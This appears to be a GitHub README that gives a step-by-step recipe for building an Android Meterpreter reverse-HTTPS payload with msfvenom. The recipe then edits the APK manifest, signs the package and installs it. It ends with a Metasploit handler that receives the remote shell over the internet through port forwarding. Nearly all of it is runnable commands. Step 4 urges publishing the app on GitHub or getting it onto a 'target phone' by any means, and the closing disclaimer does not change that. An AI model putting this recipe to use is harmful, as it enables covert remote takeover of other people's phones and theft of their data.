# Meterpreter Session on Android 16 - Samsung Z Flip 5 Rootless (2026):
[![github-banner.jpg](https://i.postimg.cc/sxhdzJLF/github-banner.jpg)](https://postimg.cc/n9pwYqZT)
# Android Penetration Testing Workflow: APK Modification & Local Deployment Guide:

**Update.**

**If done properly this guide now achieves fully wireless meterpreter sessions without the need to even be on the same wifi.**

This repository documents the technical process of injecting a Metasploit payload into an Android application package (APK), engineering the manifest to allow explicit execution, cryptographically signing the binary, and deploying it locally via ADB for security testing.

## Prerequisites

Ensure you have the following tools installed and available in your system path and port forwarding set up on your wifi router:
* **Wifi Router Port Forwarding Active** (`to your Computers Local IP [192.168...]`)
* **Metasploit Framework** (`msfvenom`, `msfconsole`)
* **Apktool**
* **Zipalign**
* **Java Development Kit** (`keytool`, `apksigner`)
* **Android Debug Bridge** (`adb`)

---
## Step 1: Payload Generation

Generate the payload by targeting a local machine interface. This bypasses network domain resolution entirely during local debugging.

```bash
msfvenom -p android/meterpreter/reverse_https LHOST=[YOUR PUBLIC IP] LPORT=443 -o payload_example.apk
```
---

## Step 2: Manifest Engineering

Decompile the binary package to modify its configuration, then recompile it to enforce structural integrity.

### 1. Decompile the APK
```bash
apktool d payload_example.apk -o example_folder
```

### 2. Modify the Manifest
```
 cd example_folder
```
```  
 nano AndroidManifest.xml
```
```bash
# add these permissions to AndroidManifest.xml
 <uses-permission android:name="android.permission.WAKE_LOCK"/>
 <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>  
  ```
  ctrl + o then ENTER to save, ctrl + x to exit.

### 3. Recompile the APK
```bash
# go back one directory
cd ..
```
```bash
# then recompile the apk
apktool b example_folder -o payload_example.apk
```

---

## Step 3: Cryptographic Signing

Android environments sometimes reject unsigned applications. Create a development keystore and apply it using standard cryptographic schemas.

```bash
# cd to where new apk is saved (possibly /example_folder/dist/)
zipalign -v -p 4 payload_example.apk aligned_example.apk

# Generate a development keystore
keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias

# Sign the recompiled APK
apksigner sign --ks my-release-key.jks --out signed_example.apk aligned_example.apk
```
---

## Step 4: Installing

Install onto phone using ADB or make app release on github for people to download or find a way to get it onto target phone/tablet. Be creative.

For ADB plug phone into computer and enter:
```
adb install --bypass-low-target-sdk-block signed_example.apk
```
---

## Step 5: Session Handling & Execution

In a seperate terminal, start the Metasploit framework locally to listen for the incoming reverse connection.

```bash
msfconsole
```
Inside the Metasploit console, execute the following handler configuration:

```rc
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST [YOUR PUBLIC IP]
set LPORT 443
set ExitOnSession false
run -j
```
### Expected Output
```text
[*] Meterpreter session 1 opened successfully established.
```
### Once session starts
```
sessions -l (to list sessions)
sessions -i 1 (or # of session you want to open)
```
### BOOOOOOM!!!
You got a meterpreter open! (type help to see commands available)

Contributions are welcome!

### ⭐ Support the Project

If you find this guide useful, please consider giving the project a **star** ⭐ — it helps a lot!

---

**Disclaimer:** This guide is for educational and authorized security testing purposes only. Enjoy!
